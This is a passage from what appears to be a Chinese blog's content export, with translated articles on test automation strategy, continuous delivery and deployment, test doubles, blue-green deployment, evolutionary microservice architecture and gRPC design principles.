进行验证的逻辑构建 E2E 测试。永远不要引入超出必要的其它依赖以证明某些东西正常工作。确定需要测试的逻辑或行为，并创建一个完全隔离该行为的测试。 仅使用更高级别的测试来测试事物的实际集成，而不是这些事物中的逻辑。\n最重要的一点是，端到端测试是有风险的，并且在很少情况下是测试特定功能的最佳类型。通过价值曲线来说明测试类型选择策略：应该总是选择达到同样价值且成本最低的测试类型，并对乐观估计通过大规模自动化所节省的时间保持怀疑。\n这种类型的成本效益分析正是多年前产生自动化测试金字塔概念的思想。自动化测试金字塔主张，在所有条件相同的情况下，你通常需要更多的小型快速廉价测试和更少的大型慢速昂贵测试。\n虽然我不会试图让你相信你的测试套件的形状必须始终并且完全是一个金字塔（Kent Dodds 说它是一个奖杯的形状，James Bach 更喜欢地球层次模型，Justin Searls 说这只是一种分心），我希望我确实让你相信所有测试自动化都会带来风险，并且确保在适当的级别创建对应类型的测试有助于减轻和控制这种风险。自动化工作的很大一部分（与团队的其他成员合作！）是准确确定哪种类型的测试是合适的，并判断能够提供终身正向价值的可能性。\n换一种说法：所有的自动化都应该被视为一种投资，特别是一种风险投资。每种类型的自动化测试代表不同类型的风险，我们需要通过不断评估成本和收益来管理整体风险并最大化投资价值。\n自动化工厂和头重脚轻的测试套件 #让我们再看看“自动化工厂”。\n如果考虑 QA 将从用户故事和验收标准中创建测试用例，你认为这些测试用例会自然映射到哪种类型的自动化测试？ 如果我们只是盲目地把测试用例自动化，通常会创建什么类型的自动化测试？\n借助普遍接受的敏捷文档技术，例如：需求优先级、以用户为中心的语言（通常我们甚至称其为用户故事）传达给测试人员。 想想“Given-When-Then”和“As a\u0026hellip;\u0026hellip;I want\u0026hellip;\u0026hellip;so that \u0026hellip;\u0026hellip;”的验收条件。\n即使故事被水平分割并描述特定组件的行为（例如 REST 服务的 API），需求也会以该组件的“用户语言”进行沟通。 因此，从本创建的测试用例自然会映射到更大、风险更高的测试自动化类型。\n这是自动化工厂方法的根本问题——把测试用例自动化的方法不可避免地过分强调大型、缓慢和昂贵的自动化测试，因为测试用例自然是用手动测试人员的语言编写的。因此它们映射到价曲线里恰恰是我们要避免的自动化测试类型！\n第二个促使自动化人员错误地更喜欢大型 E2E 测试而不是小型测试的强大因素是因为 大型 E2E 测试从心里上会让非技术人员（以及一些技术人员）感到放心。例如，业务负责人可以理解测试用例，因为大型测试用例采用他们所熟悉的业务语言描述了应用程序的功能，而知道这些用例会被自动的执行会让他们安心。这样他们就不会在凌晨 2 点接到愤怒客户的电话。而开发团队有 90% 以上的单元测试覆盖率则不会达到这样的效果。\n因此，有些人会推行自动化测试用例百分比和自动化测试数量这样的指标，因为这会让他们感到更舒服，而不是因为它实际上是一种更有效或更高效的自动检查系统的方法或行为。推行每个测试用例自动化可能会让你感到安全，但不会创建一个健康的自动化套件。\n自动化测试工厂的症状 #以“输入测试用例，输出自动化测试”为目标的自动化测试工厂的常见症状如下：\n测试套件需要花费数小时才能执行完成，或者只能在夜间运行。 自动化团队的唯一目的是对先前执行的失败的测试原因进行分析并分类——这会占用他们大部分时间。 减少测试失败的方式是不断重新执行直到测试通过。 从 CI/CD 流水线中删除测试套件，或将其降级为非阻塞步骤。 开发人员避免或完全拒绝运行测试套件，因为他们不信任测试套件的测试结果。 包含数千个测试的套件，分布在数百个文件夹（甚至是不同的代码库！）中，包含重复的测试、注释掉测试以及没人知道做了什么就通过的测试。 自动化工程师为管理臃肿的测试套件或用 Gherkin（例如：Cucumber等）隐藏背后复杂性花费了巨大的精力。 所有这些症状都表明测试套件没有为团队提供价值。不幸的是，这在开发组织中很常见。受苦的团队在他们的开发过程中优先考虑测试自动化，但以一种天真的自动化工厂心态来对待它，这是值得反思的。\n健康的自动化 #OK，那么应该如何处理测试自动化以避免臃肿的自动化测试套件？\n应通过分析每种测试类型所对应的自动化选项来全面评估新功能的自动化测试需求。不要假设新功能必然需要新的最高级别的 E2E 测试。相反，评估功能如何通过所有的测试类型分层覆盖。\n你需要的不是用例的自动化，而是功能点测试的自动化。测试用例只包含了功能点的部分测试，但把每个分散的测试用例自动化到的功能点自身的自动化测试中，从测试人员手工所执行的角度上看，永远不会有效或高效。\n事实上，测试新功能的最有效方法可能只是更新现有的自动化测试，将测试转化成更合适的测试类型，甚至创建全新的测试类型。不要忘记，随着系统功能的变化，你应该尽可能地删除测试，就像添加测试一样！\n虽然你需要的测试类型高度依赖于系统架构、可接受的风险概况、现有工具等。通常健康的自动化调整方法如下：\n在可能的最低级别添加新测试。 更新现有自动化测试以覆盖新功能。 删除任何现在过时或冗余的测试，或合并测试。 在高级别测试一般情况，然后将该测试分散到更小、更低类型的测试中。 仅在绝对必要时添加新的高级 E2E 测试。 如果任何现有类型的测试都无法涵盖此功能，则引入一种新类型的自动化测试。 修改系统架构以启用新型自动化测试。 与开发团队一起持续和批判性地评估所有测试类型的健康状况。 上述第 7 点值得特别关注，因为它是健康自动化方法和自动化工厂之间的关键区别。\n作为开发团队，我们必须停止将测试自动化视为在软件构建之后才做的事情。相反，自动化应该被视为软件开发过程本身的关键部分。自动化必须随着软件的发展而发展，对自动化的需求应该像任何其他设计需求一样推动系统的架构设计。\n这样会使更小、更经济的测试自动化类型在缺乏可自动化设计的系统里无法应用。健康的架构是为了测试而设计的，而自动化的作用就像在系统构建后才通知系统设计人员有这些设计需求。\n了解所有自动化都有成本并且这些成本会带来风险，应该使用不同类型的自动化测试来测试功能，测试自动化的挑战是适当地利用不同的测试类型从整体上创建最有效和最高效的自动化套件，并意识到可测试性在系统设计中与任何其他要求一样重要——这是测试自动化的健康方式。而创建“自动化工厂”并盲目地用高层级的自动化测试把所有测试用例自动化则不是。\n参考 #在互联网上可以找到成吨的健康测试分布、测试类型、测试投资、以及其它在本文中讨论的主题。不幸的是，它们被大量肤浅、不知情的猜测和营销材料所掩盖。\n以下是一些是关于本话题我最喜欢的内容：\nThe Practical Test Pyramid, Ham Vocker\nTesting Strategies for a Microservice Architecture, Toby Clemson\nThe Diverse and Fantastical Shapes of Testing, Martin Fowler\nWrite Tests. Not too Many. Mostly Integration, Kent C. Dodds\nThe Testing Trophy and Test Classifications, Kent C. Dodds\nTesting Pyramid Ice-Cream Cones, Alister Scott\nRound Earth Test Strategy, James Bach\nJust Say No to more End-to-End Tests, Mike Wacker\nTesting vs Checking, Michael Bolton and James Bach\nThe Regression Death Spiral, Blake Norrish (对，这也是我写的)\nTest Cases are not Testing, James Bach and Aaron Hodder\nThe Oracle Problem in Software Testing, A survey，IEEE TRANSACTIONS ON SOFTWARE ENGINEERING\n(完)\n","date":"May 11, 2022","permalink":"/blog/2022/2022-05-11-do-not-automate-test-cases/","section":"Blogs","summary":"","title":"【翻译】不要把测试用例自动化"},{"content":" 原文: https://continuousdelivery.com/2010/08/continuous-delivery-vs-continuous-deployment/\nTimothy Fitz 关于持续部署的博客文章(中文版)在我和 Dave 出版《持续交付》一书之前一年多就发表了。 为什么我们选择了不同的名字呢？ 是实际上有区别还是我们心血来潮？\n我们决定把这本书叫做《持续交付》有几个原因。首先，有一个有点学究的事实是：部署并不意味着发布。就像我们在书中说的那样，你可以持续部署到 UAT 环境——这不是什么太大的问题。持续部署特别之处在于每次变更都要通过自动化测试（或者通过可选的 QA 门禁）到生产环境。持续部署是一个发布每个良好构建给用户的实践——更精确的名称可能是“持续发布”。\n尽管持续部署意味着持续交付，但反之并不成立。持续交付是把发布计划的决策权交给业务，而不是 IT。实施持续交付意味着确保您的软件在其整个生命周期中始终处于生产就绪状态 - 任何一次构建都可能在几秒钟或几分钟内使用完全自动化的过程发布给用户。\n这又依赖于构建、测试和部署过程的全面自动化，以及参与交付的每个人（开发人员、测试人员、DBA、系统管理员、用户和业务）之间的出色协作。\n在持续交付的世界中，当开发人员把特性交给测试人员测试时，或者当功能“QA 测试通过”时，他们并没有真正“完成”这个特性。直到特性在生产环境中真正工作时才算“完成”。这意味着不再有测试或部署阶段，即使在一个 sprint 中（如果您使用 Scrum）。 如果你正在使用看板并且想要进行持续交付，直到故事发布给用户之前，这个故事都没有发挥作用。\n然而，向用户发布每次成功的构建并不总是有意义的。特别是当软件变更和硬件变更之间存在耦合时，这对于嵌入式产品通常是不可能的。 在 COTS 的世界中，有充分的营销和售后支持理由说明为什么你不想随时时间使用多个“已发布”版本的软件（尽管你仍然可以做常规的“开发人员”或“早期访问”的版本，如 Eclipse 和 Omni Group 所做的那样）。可能还有其他好的动因——但重要的是它们必须是业务驱动。\n那么你什么时候可以说你在做持续交付呢？ 我想说的是，如果你认为这是为客户提供价值的最佳方式，那么你可以切换到持续部署。特别是，如果你无法保证向用户每次发布一个成功的构建。那么“完成”一个故事意味着什么？ 我认为至少必须满足以下条件：\n你已经针对包含故事的构建运行了整个测试套件。 这些测试套件验证了故事预期交付的业务价值，并且在开发过程中没有引入任何回归。为了提高效率，这意味着在单元、组件和验收级别进行全面的自动化测试。\n该故事已在类生产环境中向客户展示。类生产环境意味着在合理的范围内与生产环境相同。 即使你要部署到一个庞大的集群，你也可以使用蓝绿部署之类的技术在生产环境中并行运行不同版本的应用程序，而不会影响用户。\n部署到生产环境没有障碍。 换句话说，如果你决定，只需按一下按钮，你就可以使用完全自动化的流程将构建部署给用户。 尤其是你还测试了它是否满足其非功能特性，例如容量、可用性和安全性。 如果您正在使用 SOA，或者你的应用程序和其他系统之间存在依赖关系，要确保其中没有集成问题。\n（完）\n","date":"April 22, 2022","permalink":"/blog/2022/2022-04-21-continuous-deployment-vs-continuous-delivery/","section":"Blogs","summary":"","title":"【翻译】持续部署 vs 持续交付"},{"content":"","date":null,"permalink":"/tags/devops/","section":"Tags","summary":"","title":"DevOps"},{"content":" 原文：https://martinfowler.com/bliki/TestDouble.html\nGerard Meszaros 正在编写《xUnit测试模式》。他遇到的一件尴尬的事情是 stub, mock, fake, dummy 的各种名称的定义，以及人们用来替代测试系统的某些部分的其他东西。为了解决这个问题，他提出了自己的词汇表，我认为这个词汇表值得进一步传播。\n他使用的通用术语是测试替身（想想特技替身）。 测试替身是一个通用术语，用于替换生产对象以进行测试的任何情况。 Gerard 列出了多种类型的测试替身：\nDummy对象用于填充参数列表，实际上不会真正的使用。\nFake对象实际上已经有了可以工作的实现，但是通常会采取一些捷径，这使得它们不适合放在生产环境。（ 内存数据库比如 SQLite 就是一个好例子）\nStub为测试期间的调用提供了预设的返回值，通常不响应超出测试内容的请求。\nSpy也是 Stub，并且会记录一些读对象如何被调用的信息。例如一个 E-mail 服务记录了多少消息被发送。\nMock 预先编程了期望的返回值，这些期望的返回值形成了它们预期接收到的调用规范。 如果它收到了他们非预期的调用，可以抛出异常，并在验证过程中进行检查是否获得了所有调用的期望结果。\n（完）\n","date":"April 20, 2022","permalink":"/blog/2022/2022-04-20-testdouble/","section":"Blogs","summary":"","title":"【翻译】测试替身"},{"content":" 原文: https://testing.googleblog.com/2021/06/how-much-testing-is-enough.html\n每个软件开发人员和团队都要面临的一个熟悉问题是：“发布一个版本要做多少测试才足够？”\n这个问题的答案很大程度上取决于软件的类型、用途和目标受众。相比测试智能手机中“手电筒”这种简单的应用程序，人们会期望用一种更严格的方法来测试商业搜索引擎。然而，无论是什么应用，做多少测试才足够的问题很难有一个明确的答案。更好的办法是为当下的情况提供一组用于定义质量验证过程和测试策略的考虑因素或规则。下面提供了一个有用的评估项列表：\n记录你的测试过程或策略 拥有坚实的单元测试基础 不要吝啬集成测试 对关键用户旅程执行端到端测试 理解并实施其它层次的测试 了解你的代码和功能覆盖率 利用现场反馈来改进测试流程 记录你的测试过程或策略 #如果你已经在测试产品，请记录下整个过程。这对于未来发布版本的重复测试及其质量改进分析至关重要。如果这是你第一次发布软件，有一个书面的测试计划或测试策略是一个好主意。事实上，任何产品设计都应该有书面的测试计划或策略。\n拥有坚实的单元测试基础 #一个很好的测试起点是随同代码编写单元测试。单元测试会测试功能单元级别的代码。外部服务的依赖采用 Mock 或者 Fake 的方式处理。\nMock有与生产环境上的依赖服务相同的接口，但这种方法仅检查对象是否根据期望和返回由测试本身控制的值，而不会完整实现依赖项的功能。\nFake是依赖项的轻量级实现，但理想情况下它自己应当没有依赖。\nFake 提供了比 Mock 更广泛的功能，并且应该由提供该依赖项生产环境的团队维护。这样一来，随着依赖项的更新，Fake 和单元测试的编写者对 Fake 完整反映了生产环境的功能是充满信心的。\n包括 Google 在内的许多公司，都会要求代码变更必须通过相应的单元测试用例这一最佳实践。并且随着代码库的扩大，在提交代码之前执行大量单元测试是在 Bug 引入代码库之前捕获它们的重要措施。 这可以节省以后编写集成测试、调试以及验证对当前代码修复的时间。\n不要吝啬集成测试 #随着代码库的增长，一定会到达一个点，可以把一组功能单元作为一组进行测试。这时候就该拥有一个坚实的集成测试基础了。一个集成测试需要一些功能单元，通常只有两个功能单元，作为一个整体来测试它们的行为，验证它们是否可以协同工作。\n开发人员通常认为可以降低集成测试的优先级甚至跳过编写集成测试，这有利于完整的端到端测试。 毕竟，后者真正测试了用户使用产品的行为。 然而，拥有一套全面的集成测试与拥有坚实的单元测试同样重要（请参阅早期的 Google 博客文章：Fixing a test hourglass）。\n由于集成测试比完整的端到端测试的依赖更少。因此，集成测试需要较少的资源。这比拥有完整依赖项的端到端测试更快、更可靠（请参阅早期的 Google 博客文章，Test Flakiness - One of the main challenges of automated testing）。\n为关键用户旅程（Critical User Journeys）执行端到端测试 #目前为止的讨论涵盖了在产品组件级别的测试，首先作为单个组件（单元测试），然后作为一组组件及其依赖项（集成测试）。现在是时候像用户一样端到端地测试产品了。 这一点非常重要，因为不仅要测试独立的功能，还要测试包含其它功能的整个流程。 在谷歌，这些工作流程（关键目标和用户为实现该目标而执行的任务旅程的组合）被称为关键用户旅程 (Critical User Journeys，CUJ)。 理解 CUJ 并记录整个流程，然后使用端到端测试（理想情况下是以自动化方式）完成整个自动化测试测试金字塔。\n理解并实施其它层次的测试 #单元测试、集成测试和端到端测试解决了产品的功能级别的测试。 了解其它层的测试也很重要，包括：\n性能测试 - 度量你的应用或服务的延迟和吞吐量。 压力或伸缩性测试 - 在越来越高的压力下测试你的应用或服务。 容错性测试 - 测试你的应用的行为在不同的依赖失效或者全部宕机是否正常。 安全测试 - 测试您的服务或应用程序中的已知漏洞。 可访问性测试 - 确保产品可供所有人使用和使用，包括各种残障人士。 本地化测试 - 确保产品可以在特定语言或地区使用。 国际化测试 - 确保产品可以被世界各地的人们使用。 隐私测试 - 评估和转移产品中的隐私风险。 可用性测试 - 测试产品对用户的友好性。 同样，重要的是要在你的评审周期中尽早执行这些测试过程。较小的性能测试可以更早地检测到问题回归，并节省端到端测试期间的调试时间。\n理解你的代码和功能的测试覆盖率 #到目前为止，我们已经从定性的角度研究了做多少测试足够的问题。对不同类型的测试进行了回顾，并总结出较小和较早的测试比较大或较晚的更好。接下来将采用代码覆盖率从定量的角度继续研究这个问题。\nWikipedia 有一篇关于代码覆盖率的精彩文章，讨论了不同类型的覆盖率，包括语句（Statement）、边界（Edge）、分支（Branch）和条件（Condition）等覆盖率。 有一些开源工具可用于度量大多数流行编程语言（如 Java、C++、Go 和 Python）的测试覆盖率。以下是部分工具的列表：\n语言 工具 Java JaCoCo Java JCov Java OpenClover Python Coverage.py C++ Bullseye Go 内置覆盖率支持(go -cover) 表1 - 不同编程语言的开源代码覆盖率工具\n这些工具中的大多数都以百分比形式提供覆盖率摘要。 例如，80% 的代码覆盖率意味着 80% 的代码被测试覆盖，20% 的代码未被测试覆盖。 同时，重要的是要理解，即便测试覆盖了特定的代码段，这段代码仍然可能出现 Bug。\n覆盖率里有一个概念称为变更列表覆盖率。 变更列表覆盖率度量修改或添加代码行数的覆盖率。对于那些累积了技术债务且覆盖率低的代码库来说，这个指标对拥有这样代码库的团队很有用。这些团队可以制定一项政策，通过增加他们的增量测试覆盖率来促进整体的覆盖率提升。\n到目前为止，对覆盖率的讨论集中在测试对代码（函数、行）的覆盖。另一种类型的覆盖率是特性或行为的覆盖。\n对于特性覆盖，重点是识别特定版本中包含的特性并为其实现创建测试。 对于行为覆盖，重点是识别 CUJ 并创建适当的测试来追踪整个流程。 同样，了解您“未被覆盖”的特性和行为是帮助你理解风险的有用指标。\n利用现场反馈来改进测试流程 #了解和改进质量验证过程的一个非常重要的部分是软件发布后的直接反馈。拥有一个跟踪中断、Bug和其他问题的流程，以及改进质量验证的行动项列表，对于最大限度地降低后续版本中的回归风险至关重要。 此外，改进行动项列表应该：\n强调在质量验证过程中尽早填补测试缺口。 解决策略问题，例如缺乏特定类型的测试，例如负载或容错测试。 这就是为什么记录质量验证过程很重要，它可以让你根据现场获得的数据重新评估整个过程。\n总结 #创建全面的质量流程和测试策略来回答“做多少测试才足够？”这个问题，也许是一项复杂的任务。希望这里给出的提示可以对你有所帮助。 总之：\n记录你的测试过程或策略 拥有坚实的单元测试基础 不要吝啬集成测试 对关键用户旅程执行端到端测试 理解并实施其它层次的测试 了解你的代码和功能测试覆盖率 利用现场反馈来改进测试流程 （完）\n","date":"April 16, 2022","permalink":"/blog/2022/2022-04-16-how-much-testing-is-enough/","section":"Blogs","summary":"","title":"【翻译】做多少测试才足够"},{"content":" 原文: http://timothyfitz.com/2009/02/08/continuous-deployment/\n蓝绿部署的故事，就像经常发生的那样，是关于辅导一个棘手的客户。我领导的构建团队发现测试环境和生产环境之间存在很多差异。（每个测试环境之间也存在差异，但这是另一类模式！）\n我们认为检查版本的最安全方法是将应用程序一起部署到与实时系统相同的物理机上。 我们的应用正在运行具有“域”概念的 WebLogic 上，“域”只是一个存放应用程序文件的目录。 我们会将新版本部署在相邻的目录中，我们称之为“影子域”（它有一个漂亮的幻想：“准备发布影子域！”等），并将这个应用绑定到本地另一个端口，然后直接连接到端口进行冒烟测试。 如果我们对部署感到满意，我们就可以切换前端控制器（在本例中是一个 Apache 服务器）指向新部署的应用。如果出现任何问题，我们可以通过修改控制器指向当前实例立即回滚，前提是我们没有进行任何破坏性的数据库更改 .\n我们考虑过将这组并排的环境称之为 A 环境和 B 环境，直到有人指出如果应用程序崩溃并且它恰好部署在 B 环境中，第一个问题将是“你为什么不使用 A 环境 ？” 因为显然 A 比 B 好！ 我们需要没有明显层次结构的方法来给域打标签。因此我们选择了颜色。如果你的域被称为蓝色、绿色、橙色、黄色等，那么显然没有“最好”的。 我们避免使用红色域，因为这听起来很危险。 （“你在红域中运行？？”）\n最后我们只使用了两个域——我们曾认为我们可能有几个颜色候选并轮换，但我们发现有两个就足够了——恰好是蓝色和绿色。当我们开始为《持续交付》一书命名模式时，“蓝绿部署”这个名字在团队中有点流行。 我认为 Jez Humble 和我自己都这么称呼它，而客户并没有被这个提法吓坏。\n十多年后的现在这很有趣，并成为了常见用语。\n（完）\n","date":"April 14, 2022","permalink":"/blog/2022/2022-04-14-the-origins-of-blue-green-deployement/","section":"Blogs","summary":"","title":"【翻译】蓝绿部署的起源"},{"content":" 原文: http://timothyfitz.com/2009/02/08/continuous-deployment/\nAlex 已经重构了一些网站后端的代码。当提交这个小任务的代码后，Alex 继续开发下一个特性。\n当代码部署到生产环境两周以后，这段代码让整个网站宕机。自动化测试没有测试到一个字符导致的拼写错误，连锁故障让人想起了 Twitter 刚刚发布的时候。人们花了8个小时隔离问题，修复了这个错误的字符，并部署到生产环境，终于回复正常。\nAlex 诅咒运气，指责人类的无懈可击，以及软件工程不可避免的成本，然后继续下一个任务。\n这个故事每天都在我所知道的创业公司发生。这很糟糕。Alex 有一个她不知道的问题。她的软件开发实践是不可持续的。像这样“愚蠢的失误”会随着产品增长的越来越复杂、团队越来越大而变得更加频繁。Alex 需要切换到一个可以规模化的解决方案。\n在我的到这个解决方案前，让我先告诉你一些常见的解决方案。当这些解决方案产生了真实的问题后，它们就不是能解决 Alex 境遇的解决方案。\n更多的手动测试：这个明显不可能随着复杂性的提升而规模化。这么做也无法逐字的捕获每个问题，因为你的测试沙箱或者测试集群永远无法做到和生产环境一模一样。\n更多前置的计划：前置计划就像烹饪菜谱中的条目。它无法准确的告诉你多少是多，多少是少。但是我将要告诉你要刚刚好——不要太多也不要太少，因为那些无疑会毁掉了食物或这产品。过度计划的自然趋势是专注于非现实问题。 现在你会犯更多愚蠢的错误，但它们将是针对那些无关紧要的需求设计的。\n多的自动化测试：自动化测试很棒，更多的自动化测试更好。但无论多少自动化测试都无法确保在人类的天性下某个功能完全正常，因为没有任何自动化测试会像用户那样残酷、随机、恶意、无知或激进。\n代码审查和结对编程是优秀的实践：这些实践将提升代码质量，防止缺陷并培养你的程序员。虽然这些实践可以在很大程度上减少缺陷，但最终他们受到以下事实的限制：虽然两个人比一个人好，但他们仍然是人。 这些实践只能捕获到你的组织作为一个整体已经有能力能够发现的故障。\n降低发布频率：虽然这么做可以降低宕机时间（软件中断并回滚），但开发和返工时间会更大，失误仍然会继续出现。其自然的趋势会导致发布更加不频繁，直到你完全不发布。然后你会被强迫做一次完全的重写，这依然是末日。\n那么 Alex 应该怎么办呢？ 持续部署！让每一次代码提交应当立即部署到生产环境。让我们重新看看 Alex 的故事，假设她已经可以使用理想的持续部署实践。Alex 提交代码。几分钟后她集群健康状态异常。故障很容易追溯到并会滚 Alex 的变更。Alex 花了最少的时间调试，找到它的拼写错误很容易。她的变更仍然导致了级联的故障，但是宕机时间已经最小了。\n这是经典的快速失败模式在软件发布过程中的一个实现。你和引入故障变更越近，你就能获得更多的数据修复这个故障。在代码中快速失败意味着在输入无效的时候抛出一个异常而不是等待它在以后未知的地方出错。在一个软件发布的过程中快速失败意味着尽快发布未部署的代码，而不是等待一周后出现发布故障。\n持续部署是简单的：只需要越来越频繁的发布你的代码。也许从今天开始替代每周或者每月的发布频率，但是随着时间的推移，你会达到理想的目标并且在过程中持续获得收益。\n2009年2月8日\nTimothy Fitz\n（完）\n","date":"April 13, 2022","permalink":"/blog/2022/2022-04-13-continuous-deployment/","section":"Blogs","summary":"","title":"【翻译】持续部署"},{"content":" 原文:https://www.thoughtworks.com/insights/blog/microservices-evolutionary-architecture 本文翻译时《演进式架构》已由人民邮电出版社出版。\n微服务架构风格正在风靡全球。 2015年3月 O\u0026rsquo;Reilly 举办了第一次软件架构大会，委员会收到的大部分摘要都涉及微服务的某些方面。为什么这种架构风格突然风靡一时？\n微服务是 DevOps 革命后的第一个架构风格，也是第一个完全接受持续交付工程实践的架构风格。它也是一个演进式架构的例子，把支持增量式非破坏性的变更作为众多应用架构维度的第一原则。然而，在众多支持某些特定架构演化行为的架构中，它仅是其中一种。 本文探讨了这类架构风格的一些特点和原则。\n演进式架构 #软件行业中的常识曾坚持认为架构元素“以后很难改变”。一个演进式的架构会把支持增量变更的设计作为首要原则。演进式架构之所以吸引人，是因为软件变更在历史上难以预测且改造成本高昂。如果将演进的变更内置到架构中，软件的变更将变得更容易、更便宜。进而允许开发实践、发布实践的变更以及整体的敏捷性发生改变。\n微服务之所以符合这个定义，是因为其强大的限界上下文原则，使得在领域驱动设计（Domain Driven Desgin）中描述的逻辑划分成为物理上隔离的原则。微服务通过机器配置、测试和自动化部署等高级 DevOps 实践来实现这种物理上隔离。因为每个服务都与所有其他服务（在结构级别）解耦，所以微服务的替换就像替换乐高积木中的一片。\n演进式架构的特征 #演进式架构会表现出几个共同的特征。我们在《演进式架构》一书定义了大量的特征；本文将介绍其中的一小部分。\n模块化和耦合 #如果开发人员想要进行非破坏性更改，沿着明确定义的边界分离组件的能力具有明显的好处。没有任何架构元素会因为缺乏边界划分而无法演进，例如通常说的大泥球架构。\n上图来自某客户项目的大泥球中的类（圆形边界上的点）之间的耦合。\n不适当的耦合会以难以预测的方式传递变化从而抑制架构演进。演进式架构都支持某种程度的模块化，往往表现在技术架构上（例如经典的分层架构）。\n围绕业务能力组织架构 #受领域驱动设计的启发，现代成功的架构也越来越多地在领域架构级别具有模块化的特征。基于服务（Service-based）的架构与传统面向服务架构（Service-Oriented Architecture，SOA）的主要区别在于分区策略：面向服务架构严格按照技术层次进行服务划分，而基于服务的架构则倾向于微服务的按领域划分。\n实验 #实验是演进式架构向业务提供的“超级能力”之一。一些运维成本较低的细微应用程序变更使得持续交付中的 A/B 测试、金丝雀发布 等实践变得可行。通常，微服务架构是围绕服务之间的路由设计的，用以定义应用程序，并允许特定服务的多个版本同时存在。这又反过来允许对现有服务的功能进行实验和逐步替代。最终，这种力量能让你的企业用更少的时间来评估需求优先级，取而代之的是通过假设驱动开发。\n演进式架构的原则 #通过原则是思考演进式架构的一种方式。这些原则描述了架构本身或设计架构设计方法的各种特征。一些原则将注意力集中在设计架构过程中何时做出特定的架构决策。\n适应度函数 #我们区分新生(emergent)和演进式(evolutionary)的架构。这种区分很重要，就像在遗传算法等演化计算技术中一样，架构适应度函数规定了目标架构的特性。一些系统需要较长的正常运行时间，而另一些则更关心吞吐量或安全性。\n上图是用于突出显示适用于该软件系统的重要适应度函数的雷达图。\n首先需要思考的问题是用什么样的适应度函数应该为特定系统的提供决策指导。架构决策是通过适应度函数进行评分的，因而可以看到架构是否正在朝着正确的方向演进。\n负痛前行 #受极限编程社区的启发，持续交付和演进式架构中的许多实践都体现了“负痛前行”的原则。 当项目中的某些事情有可能导致痛苦时，强迫自己更早更频繁去做这些事，这反过来又会鼓励你将痛苦自动化并及早发现问题。 常见的持续交付实践，如部署流水线、自动机器配置和数据库迁移，通过消除变更中的常见痛点，使架构演进更容易。\n最后的负责时刻 #何时做出架构决策是传统架构和演进架构之间的主要区别。这些决策可能围绕应用程序的结构、技术栈、特定工具或通信模式。在传统架构中，这些决策会在编写代码之前很早就表明。而在演进式架构中，我们会等待最后的需要负责的时刻做出决定。延迟决策的好处是可获得可用于做出决策的额外信息。成本是一旦做出决定就可能产生的返工工作量。这可以通过适当的抽象来减轻，但成本仍然是真实存在的。过早做出决定的代价也是真实的。考虑选择消息工具。不同的工具支持不同的功能。如果我们选择了一个比我们最终的需要更重的工具，它就会成为项目中技术债务的来源。这种债务以使用错误工具造成的演进负担的形式出现。这不是先发制人地“抽象所有事物”的借口，而是在适当的时候做出决定的明智尝试。我们仍然支持敏捷中的 YAGNI（You aren\u0026rsquo;t gonna need it，你不需要它）原则。\n当然，最直接的问题是什么时候才是“最后的负责时刻”。适应度函数为“最后的负责时刻”的决定提供指导。应尽早做出对架构设计取舍产生重大影响的决策或影响项目关键成功因素的决策。 推迟这样的决定对项目的影响往往大于等待的收益。\n结论 #软件架构师有责任阐明关于系统如何满足所有需求的决策。通常是采用创建图表的方式。太多的架构师没有意识到，静态的架构图保质期很短。软件行业是一个不断变化的领域；它是动态的而不是静态的。架构不是一个方程式，而是一个正在进行过程的快照。\n持续交付和 DevOps 运动说明了忽视实现架构和保持更新所需工作量的陷阱。对架构进行建模并完成这些工作没有错，但这只是第一步，而架构在运行之前是抽象的。 换句话说，你不能真正判断任何架构的长期可行性，除非你不仅实现了架构并且对其进行了升级。甚至可能使它能承受更不寻常的事件。\n架构师的运维意识对于演进式架构至关重要。演进会影响实现的细节，因此不能忽略实现细节。持续交付对架构的要求使架构的实现更加可见并简化了架构的演进。 因此，持续交付是任何演进架构的重要推动力。\n","date":"April 10, 2022","permalink":"/blog/2022/2022-04-10-microservices-as-evolutionary-architecture/","section":"Blogs","summary":"","title":"【翻译】作为演进式架构的微服务架构"},{"content":"","date":null,"permalink":"/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/","section":"Tags","summary":"","title":"微服务"},{"content":"","date":null,"permalink":"/tags/%E6%BC%94%E8%BF%9B%E5%BC%8F%E6%9E%B6%E6%9E%84/","section":"Tags","summary":"","title":"演进式架构"},{"content":" 原文: https://grpc.io/blog/principles/\n动机 #十多年来，Google 一直在使用一个名为 Stubby 的通用 RPC 基础设施来连接数据中心内和跨数据中心运行的大量微服务。我们的内部系统长期以来一直采用今天流行的微服务架构。拥有统一的跨平台 RPC 基础架构可以在整个组织范围内推广效率、安全性、可靠性和行为分析，这对于支持该时期令人难以置信的增长至关重要。\nStubby 有许多很棒的特性——但是，它不基于任何标准，并且与我们的内部基础设施耦合太紧密，不适合公开发布。随着 SPDY、HTTP/2 和 QUIC 的出现，许多相同的特性已经出现在公共标准中，以及 Stubby 不提供的其他特性。很明显，是时候重新设计 Stubby 以利用标准化技术，并将其扩展到移动、物联网和云的使用场景下。\n原则和需求 #采用服务而非对象，采用消息而非引用 #推广系统间粗粒度消息交换的微服务设计理念，同时避免 分布式对象的陷阱和无视 网络的谬误。\n覆盖率和简单性 #该技术栈应该在每个流行的开发平台上都可用，并且人们可以轻松地为他们选择的平台构建。 它在 CPU 和内存有限的设备上应该是可以使用的。\n自由和开放 #让所有人自由使用所有基本功能。 将所有工件作为开源工作发布，并带有应促进而不是阻碍采用的许可证。\n互操作性和可达性 #有线网络协议必须能够穿越常见的互联网基础设施。\n通用性和高性能 #与特定于场景的技术栈相比，该技术栈应适用于广泛的场景，同时几乎不会牺牲性能。\n分层 #技术栈的关键方面必须能够独立发展。 对格式的修订不应破坏应用层绑定。\n消息内容不可知 #协议和实现必须允许不同的服务使用不同的消息类型和编码，例如protocol buffers、JSON、XML和Thrift。 同样，数据压缩的需求因用例和数据类型而异：协议应允许可插拔的压缩机制。\n使用流 #存储系统依靠流和流控制来传输大型数据集。其他服务，如语音到文本或股票行情，依靠流来表示时间相关的消息序列。\n阻塞和非阻塞 #支持客户端和服务器交换的消息序列的异步和同步处理。 这对于在某些特定平台上的伸缩和流处理至关重要。\n撤销和超时 #运维是昂贵且长期的——撤销允许服务器在客户端运行良好时回收资源。当跟踪工作中的调用链时，可能会出现级联撤销。客户端可能会提示调用超时，这允许服务根据客户端的需要调整行为。\n优雅关闭 #必须允许服务器通过拒绝新请求而优雅地关闭，并同时继续处理正在进行的请求。\n流控制 #客户端和服务器之间的计算能力和网络带宽往往不平衡。流控制允许更好的缓冲区管理以及对过度活跃的对端提供 DOS 保护。\n可插拔 #协议只是功能性 API 